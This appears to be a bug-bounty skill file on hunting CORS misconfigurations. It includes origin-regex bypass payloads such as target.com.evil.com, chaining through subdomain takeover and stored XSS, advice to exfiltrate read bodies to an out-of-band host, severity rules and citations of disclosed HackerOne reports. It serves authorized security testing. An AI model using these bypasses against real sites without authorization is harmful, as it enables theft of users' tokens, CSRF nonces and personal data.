### Trusted-insecure-origin bypass

If any `http://` origin is trusted with credentials, a network MITM reads the
body — no regex flaw needed. Check HSTS-preload; pair with hunt-tls-network.

### Pre-flight / method bypass

Reflected `Access-Control-Allow-Methods`/`Headers` for your origin let a
malicious origin drive authed `PUT`/`DELETE` — a CORS-assisted CSRF write
(Phase 4; cf. [#975983], [#867436]).

### Cache-poisoning bypass

With no `Vary: Origin`, reflect your `Origin` into `ACAO` and wait for the
cache to serve it to others — cross-user issue / DoS ([#591302], [#921704],
[#288912]).

### Chained filters

- **HPP / Host-header** — parameter pollution + Host header gave SOP bypass
  and CSRF-token exposure ([#867436]).
- **Subdomain takeover** — host the PoC on a trusted dangling subdomain
  ([#3930957], [#1404986]).
- **Stored XSS + CORS** — run the read from a trusted origin ([#1188471]).
- **Double-encoding** — encoded-origin matching tagged in [#235200].

---

## Gate 0 Validation

Before writing the report, confirm all four:

1. **What can the attacker DO right now?** Show a browser reading a sensitive
   authed body cross-origin (screenshot / console log from evil.com), or a
   state-changing cross-origin request succeeding with credentials. "The
   server reflects my Origin" alone is insufficient.

2. **What does the victim LOSE?** API keys ([#733017]), CSRF tokens
   ([#3930957], [#867436]), PII / admin usernames ([#1183601], [#772744]),
   account state ([#769058])? Tie the read to sensitive data to justify High;
   a readable `/api/health`, version page, or public user list is Low/Info
   ([#13551], [#310579]).

3. **Can it be reproduced in 10 minutes from scratch?** Endpoint still
   reflecting with `ACAC: true`? Browser PoC reliably shows the body (not
   `BLOCKED`)? Can a second person reproduce it?

4. **Did you rule out false positives?** `ACAO: *` + credentials = browsers
   block it; `ACAC: true` with no reflection of your origin proves nothing;
   `evil.target.com` reflecting when `*.target.com` is trusted by design is
   not a bug unless you control it; a regex payload not matching the actual
   flaw class is a false negative/positive. For blind contexts, exfil the
   body with a unique OOB marker.

**Severity:**
- Reflects attacker origin + creds + sensitive body, browser-proven: **High**
- Pre-flight authorizes attacker-origin state change on sensitive action: **High**
- Null-origin + sensitive authed body, browser-proven: **Medium–High**
- Subdomain-takeover / XSS-assisted credentialed read: **High/Critical**
- Cache-poisoned ACAO → cross-user DoS: **Medium** ([#591302], [#288912])
- Reflects origin, no credentials / non-sensitive: **Low–Informational**
- `ACAO: *` only (no creds possible): **Informational** unless data secret

---

## Real Impact Examples

### Scenario A: Reflect-any-origin → API-token theft (U.S. DoD pattern, #733017)

Discovery: "Upon accessing the site we discover two specific response headers
which indicates that a cross-domain request for sensitive information might
be possible — 1. Access-Control-Allow-Origin: *injectable*
2. Access-Control-Allow-Credentials: true" ([#733017]). A hosted page ran an
XHR with `withCredentials = true` against `.../api/token/list`. Because ACAO
reflected the attacker origin and ACAC was true, the browser exposed the API
key, email and name — a credentialed cross-origin read, the textbook High.

### Scenario B: Subdomain-trust regex bypass → admin panel read (Myndr pattern, #3930957)

`admin.myndr.net` reflects any `*.myndr.net` origin with `ACAC: true`;
`Origin: https://evil.myndr.net` was reflected on the admin panel and
`/auth/login-admin`, `/cp/postcode`, `/dashboard/` routes ([#3930957]). Any
site on a Myndr subdomain (including one taken over) reads authenticated
admin responses — CSRF nonces, session data, admin functionality → full admin
compromise. Root cause: trust granted to a whole suffix, not an exact origin.

### Scenario C: Regex logic + missing CSRF defenses → site-wide CSRF (CS Money, #975983)

On `new.cs.money` the anti-CSRF mechanism was a flawed `Referer` regex:
"adding `{` or `}` at the end of the domain pass the validation", so
`new.cs.money{.attacker.com` passed. With "no other protective mechanisms in
place (SameSite flag, Origin check, Content-Type check)", and Safari loading
such domains, an attacker forced a logged-in user to `change_email` — a
site-wide CSRF born from a CORS/referer origin-check flaw ([#975983]).

### Scenario D: Reflected ACAO + missing Vary → cache poisoning DoS (Automattic, #591302/#921704)

WordPress.com WP-JSON echoed an arbitrary `Origin` into `ACAO`; because the
response was cached with no `Vary: Origin`, the poisoned header was served to
other users, breaking legitimate cross-origin consumers — a DoS via CORS
header cache poisoning ([#591302], [#921704]; cf. [#288912]).

---

## Disclosed Report Citations

All 30 IDs are real and present in the study pack. Format: **Company — title**
([H1 #id](https://hackerone.com/reports/id)) — subclass, technique, year/bounty.

1. **X / xAI — CORS misconfig | Account Takeover** ([H1 #426147](https://hackerone.com/reports/426147)) — reflect-any-origin + credentials (substring `//niche.co` match), XHR credentialed read + external exfiltration, 2018 / High.
2. **UPchieve — Cross-origin resource sharing misconfig | steal user information** ([H1 #1183601](https://hackerone.com/reports/1183601)) — arbitrary-origin reflection + credentials on `/api/user`, credentialed PII read, 2021 / High.
3. **U.S. Dept Of Defense — CORS Misconfiguration Leads to Exposing User Data** ([H1 #733017](https://hackerone.com/reports/733017)) — injectable ACAO + ACAC on `/api/token/list`, API key + PII theft, 2019 / High.
4. **Semrush — Cross-origin resource sharing misconfig | steal user information** ([H1 #235200](https://hackerone.com/reports/235200)) — arbitrary-origin trust + double-encoding tag, credentialed read / IP-control bypass via browser proxy, 2017 / Medium (CVSS 5.7).
5. **UPchieve — CORS origin validation failure** ([H1 #1404986](https://hackerone.com/reports/1404986)) — origin-validation failure with `hackers.upchieve.org.evil.com` reflected + ACAC, subdomain-suffix bypass, 2021 / Medium.
6. **Sifchain — CORS (Cross-Origin Resource Sharing) origin validation failure** ([H1 #1192147](https://hackerone.com/reports/1192147)) — `sifchain.finance.evil.com` prefix bypass + ACAC, credentialed read, 2021 / None.
7. **Sifchain — CORS (Cross-Origin Resource Sharing) origin validation failure -Any website can issue requests...** ([H1 #1188471](https://hackerone.com/reports/1188471)) — prefix-origin accepted + ACAC + stored-XSS tag, credentialed read, 2021 / None.
8. **Eternal — CORS Misconfiguration on www.zomato.com** ([H1 #168574](https://hackerone.com/reports/168574)) — missing-dot suffix check (`notzomato.com`), arbitrary registered domain reads user data, 2016 / None.
9. **Myndr — Myndr CORS Misconfiguration** ([H1 #3930957](https://hackerone.com/reports/3930957)) — wildcard-subdomain reflection (`*.myndr.net`) + ACAC on admin panel, CSRF nonce/session read + subdomain takeover, — / High.
10. **CS Money — Site-wide CSRF on Safari due to CORS misconfiguration (not localhost)** ([H1 #975983](https://hackerone.com/reports/975983)) — flawed Referer regex (`{`/`}` chars) + no SameSite/Origin/Content-Type checks, site-wide CSRF, 2020 / Medium ($300).
11. **BTFS — misconfigured CORS let to HPP and SOP bypass** ([H1 #867436](https://hackerone.com/reports/867436)) — Host-header/HPP + SOP bypass, CSRF-token exposure, 2020 / High.
12. **Automattic — Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** ([H1 #591302](https://hackerone.com/reports/591302)) — reflected ACAO cached without `Vary: Origin`, cache-poisoning DoS, 2019 / Medium.
13. **Automattic — Denial-of-service By Cache Poisoning The Cross-Origin Resource Sharing Misconfiguration Allow Origin Header** ([H1 #921704](https://hackerone.com/reports/921704)) — reflected ACAO + missing Vary, cached cross-user DoS, 2020 / Medium.
14. **Semrush — Cross-origin resource sharing** ([H1 #288912](https://hackerone.com/reports/288912)) — arbitrary-origin trust + missing `Vary: Origin`, cache-poisoning risk, 2017 / High.
15. **Sifchain — CORS Misconfiguration** ([H1 #1194280](https://hackerone.com/reports/1194280)) — ACAO dynamically fetched from Origin + credentials on `/wp-json`, credentialed read, 2021 / None.
16. **Sifchain — CORS misconfiguration** ([H1 #1187543](https://hackerone.com/reports/1187543)) — reflected ACAO on `/wp-json/oembed/1.0/embed?...&format=xml`, XML-parser/json-body read, 2021 / None.
17. **Sifchain — Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information** ([H1 #1189363](https://hackerone.com/reports/1189363)) — reflected ACAO on signup-generated `/wp-json`, credentialed read, 2021 / None.
18. **Sifchain — CORS Misconfiguration Leads to Sensitive Exposure on Sifchain main domain** ([H1 #1188684](https://hackerone.com/reports/1188684)) — reflected ACAO on `/wp-json` via `Origin: http://bing.com`, unauth user-list read, 2021 / None.
19. **Yelp — CORS Misconfiguration on Yelp** ([H1 #1707616](https://hackerone.com/reports/1707616)) — reflected ACAO (`http://evil.com`) on `business.yelp.com/wp-json`, credentialed read, 2022 / Medium.
20. **Yelp — CORS Misconfiguration on trust.yelp.com** ([H1 #1716286](https://hackerone.com/reports/1716286)) — reflected ACAO on `trust.yelp.com/wp-json`, session-attack/stack-fingerprint read, 2022 / Medium.
21. **MTN Group — Unsafe cors sharing of admin users** ([H1 #772744](https://hackerone.com/reports/772744)) — reflected ACAO on `/wp-json/wp/v2/users/`, `withCredentials` admin-username read, 2020 / Medium.
22. **Mattermost — [mattermost.com] CORS Misconfiguration leakage of admin users** ([H1 #1113759](https://hackerone.com/reports/1113759)) — reflected ACAO on `/wp-json/wp/v2/users/`, unauthenticated admin-user enumeration, 2021 / None.
23. **Brave Software — Cross-origin resource sharing misconfiguration (CORS)** ([H1 #954512](https://hackerone.com/reports/954512)) — OPTIONS-method discovery on `/piwik.php` + `Origin: exploit.com`, credentialed read + server-version leak, 2020 / None.
24. **Chaturbate — Cross-origin resource sharing: arbitrary origin trusted on chatws25.stream.highwebmedia.com** ([H1 #417453](https://hackerone.com/reports/417453)) — arbitrary-origin reflection on `/ws/info`, WebSocket CORS read, 2018 / None.
25. **Infogram — CORS on (ws.infogram.com)** ([H1 #372452](https://hackerone.com/reports/372452)) — reflected CORS on `/socket.io/` with `withCredentials`, WebSocket read, 2018 / Low.
26. **Legal Robot — CORS (Cross-Origin Resource Sharing)** ([H1 #163491](https://hackerone.com/reports/163491)) — `ACAO: *` on `/sockjs/info`, SockJS wildcard CORS, 2016 / None.
27. **Nord Security — Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information** ([H1 #796557](https://hackerone.com/reports/796557)) — reflected ACAO on `/~nordvpn/api/widget/v1/faqs`, credentialed API read, 2020 / Medium.
28. **Semrush — CORS misconfiguration which leads to the disclosure of certain data concerning the user** ([H1 #769058](https://hackerone.com/reports/769058)) — permissive CORS on `/content-paywall/api/accesslevel`, subscription-data disclosure, 2020 / Low.
29. **U.S. Dept Of Defense — Bypassing CORS Misconfiguration Leads to Sensitive Exposure** ([H1 #768151](https://hackerone.com/reports/768151)) — filter-bypass + reflected ACAO on `/wp-json`, unauth user-list read, 2020 / Medium.
30. **Acronis — Cross Origin Resource Sharing Misconfiguration** ([H1 #958459](https://hackerone.com/reports/958459)) — wildcard/prefix ACAO on `/wp-json`, internal-network + CSRF read, 2020 / Medium.

---

## Related Skills & Chains

- **`hunt-csrf`** — stolen CSRF tokens enable state change ([#3930957],
  [#867436]); missing SameSite/Origin/Content-Type → site-wide CSRF ([#975983]).
- **`hunt-subdomain`** — takeover a trusted `*.target.com` → host the
  credentialed read PoC there ([#3930957], [#1404986]).
- **`hunt-xss`** — stored XSS on a trusted origin runs the read PoC ([#1188471]).
- **`hunt-dom`** — postMessage handlers with loose `event.origin` checks are a
  DOM-side sibling of HTTP CORS.
- **`hunt-tls-network`** — trusted `http://` origins (Phase 3b) require a MITM;
  verify HSTS-preload before scoring.
- **`hunt-cloud-misconfig`** — browser-proxied reads can reach internal/admin
  endpoints assuming network position ([#235200], [#958459]).
- **`triage-validation`** — apply Gate 0: browser proof mandatory, `ACAO: *`
  + creds is not a finding, match regex class, use a unique OOB marker.
- **`security-arsenal`** — load the CORS trusted-origin regex-bypass table
  before testing origin checks.


---

## Merged Source Knowledge

This section consolidates **7 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (22 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-cors/SKILL.md`

## Crown Jewel Targets

- **Reflect-any-origin + credentials** — server echoes the `Origin` header AND
  sets `ACAC: true` → any site reads authed API responses. The classic High.
- **Null-origin trust** — `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a
  `data:`/redirect chain) emits `Origin: null`, so any page can read authed data.
- **Subdomain-regex bypass** — trusted-origin regex with a parsing flaw. The
  correct payload depends on *which* flaw (see Phase 3 — this is where most
  skills get it wrong).
- **Subdomain takeover → trusted origin** — a dangling subdomain that the CORS
  policy trusts; take it over, host the PoC there (see hunt-subdomain).
- **postMessage missing/loose origin check** — handler that processes
  `event.data` without strictly validating `event.origin`.

---

## Attack Surface Signals

```
Any endpoint returning an Access-Control-Allow-Origin header
API endpoints:   /api/*, /v1/*, /graphql
Profile/account: /api/me, /api/profile, /api/user, /api/session
Secrets/tokens:  /api/tokens, /api/keys, /api/csrf, /api/account/settings
Financial:       /api/balance, /api/transactions
Admin/internal:  /api/admin/*, /api/internal/*
```

Prioritize endpoints that (a) require a session cookie and (b) return PII,
tokens, CSRF tokens, or other secrets in the body.

---

### Phase 3 — Subdomain / trusted-origin regex bypass
The right payload depends on **which** regex flaw the server has. Identify the
class first, then send the matching payload. Getting this wrong wastes the test
and produces false negatives.

| Server regex (intended: trust `*.target.com`) | Flaw | Bypass origin that matches | Why |
|---|---|---|---|
| `^https?://.*\.target\.com$` | **None** — escaped dot + end-anchor. Correct. | (no simple bypass) | `evil.target.com` is in-scope by design; `x.target.com.evil.com` ENDS in `.evil.com`, fails `$`. Move on or look for subdomain-takeover. |
| `^https?://.*target\.com$` | **Missing dot separator** (no `\.` before `target`) | `https://eviltarget.com` | `.*target\.com$` matches `eviltarget.com` — attacker registers `eviltarget.com`. |
| `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
| `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
| `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unusual origins. Confirm the browser actually sends it. |

```bash

# Find message handlers that don't strictly validate event.origin.
grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
  | grep -v "\.origin"

#   no check at all
```
postMessage is a separate class from HTTP CORS — impact is DOM-side (XSS,
client-side auth bypass). See hunt-dom for exploitation depth.

---

## Chain Table

| CORS finding | Chain to | Impact |
|---|---|---|
| Reflects attacker origin + creds | Browser-read `/api/me`, `/api/tokens`, `/api/csrf` | PII + token + CSRF-token theft → often ATO |
| Reflects origin + reads CSRF token | hunt-csrf: steal token → forge state change | CSRF on CSRF-protected forms |
| Pre-flight allows arbitrary method/header | Drive authed `PUT`/`DELETE` from evil origin | Cross-origin state change |
| Trusted subdomain has XSS | hunt-xss → run 5a from trusted origin | Reliable credentialed read |
| Dangling trusted subdomain | hunt-subdomain takeover → host 5c there | Full credentialed read |
| postMessage no/loose origin check | hunt-dom: inject iframe, send crafted message | DOM XSS / client auth bypass |

---

## Validation discipline (read before submitting)

- **Browser proof mandatory.** curl reflecting a header is NOT exploitation.
  Show a screenshot/console log of the authed body read from `evil.com`. If the
  fetch throws / logs `BLOCKED`, you have nothing.
- **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue
  wildcard if the data is sensitive unauthenticated (then it is usually Low).
- **`ACAC: true` alone proves nothing** — it must pair with your reflected
  origin AND a successful readable cross-origin body.
- **Match the regex class to the payload (Phase 3).** Do not submit
  `target.com.evil.com` against an end-anchored escaped-dot regex — it does not
  match and is not a bug.
- **`evil.target.com` reflecting is not automatically a bug** — it is an
  in-scope subdomain by design unless you can actually control it.
- **OOB confirmation** for blind/headless contexts: exfil the read body to a
  Burp Collaborator / oastify host and show the interaction. Use a unique
  per-test marker so the hit is unambiguously yours.
- **Sensitive data requirement.** A readable `/api/health` is not High. Tie the
  read to PII, tokens, secrets, or financial data to justify severity.

**Severity:**
- Reflects attacker origin + creds + sensitive body, browser-proven: High
- Pre-flight authorizes attacker-origin state change on sensitive action: High
- Null-origin + sensitive authed body, browser-proven: Medium–High
- Subdomain-takeover/XSS-assisted credentialed read: High/Critical
- Reflects origin, no credentials / non-sensitive: Low–Informational
- `ACAO: *` only (no creds possible): Informational unless data is secret
